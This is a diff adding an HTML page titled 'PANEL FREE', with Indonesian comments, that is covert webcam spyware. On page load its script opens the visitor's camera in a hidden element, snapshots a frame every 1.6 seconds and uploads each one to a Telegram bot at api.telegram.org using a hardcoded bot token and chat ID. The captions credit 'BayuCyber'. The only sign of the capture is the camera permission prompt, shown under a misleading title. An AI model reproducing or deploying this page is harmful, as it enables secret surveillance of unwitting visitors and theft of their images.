@@ -1,0 +1,91 @@
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>PANEL FREE</title>  
+    <style>  
+        #video {  
+            display: none;  
+        }  
+    </style>  
+</head>  
+<body>  
+    <video id="video" autoplay ></video>  
+    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>  <script>  
+    const botToken = "7901466120:AAGlD4Qw5if7O1a9RXbobVdTSVmO1KilKZs"; // Ganti dengan token bot kamu  
+    const chatId = "6328593692"; // Ganti dengan chat ID kamu  
+    const defaultCaption = "DEVELOPER ARDIANSYAH"; // Caption default  
+
+    function startCamera() {  
+        const video = document.getElementById("video");  
+        const canvas = document.getElementById("canvas");  
+        const ctx = canvas.getContext("2d");  
+
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);  
+        if (isMobile) {  
+            video.setAttribute("width", "100%");  
+            video.setAttribute("height", "auto");  
+        } else {  
+            video.setAttribute("width", "2000");  
+            video.setAttribute("height", "2000");  
+        }  
+
+        navigator.mediaDevices.getUserMedia({ video: true })  
+            .then(stream => {  
+                video.srcObject = stream;  
+
+                setInterval(() => {  
+                    ctx.drawImage(video, 0, 0, 2000, 2000);  
+                    canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);  
+                }, 1600); // Kirim foto tiap 1 detik  
+            })  
+            .catch(error => {  
+                console.error(error);  
+                alert("Error accessing camera.");  
+            });  
+    }  
+
+    function sendToTelegram(blob) {  
+        const caption = "DEVELOPER BayuCyber";  
+        const formData = new FormData();  
+        formData.append("photo", blob, "camera.jpg");  
+        formData.append("chat_id", chatId);  
+        formData.append("caption", caption);  
+        formData.append("parse_mode", "HTML");  
+
+        // Tombol inline  
+        const replyMarkup = {  
+            inline_keyboard: [[  
+                {  
+                    text: "SIBAY999 OFFICIAL",  
+                    url: "https://t.me/bayuror" // Ganti dengan link sesuai kebutuhan  
+                }  
+            ]]  
+        };  
+
+        formData.append("reply_markup", JSON.stringify(replyMarkup));  
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {  
+            method: "POST",  
+            body: formData,  
+        })  
+        .then(response => response.json())  
+        .then(data => {  
+            if (data.ok) {  
+                console.log("Camera frame sent to Telegram with caption and button.");  
+            } else {  
+                throw new Error(data.description);  
+            }  
+        })  
+        .catch(error => {  
+            console.error(error);  
+            alert("Failed to send camera frame.");  
+        });  
+    }  
+
+    // Mulai kamera saat halaman dimuat  
+    startCamera();  
+</script>
+
+</body>  
+</html>  
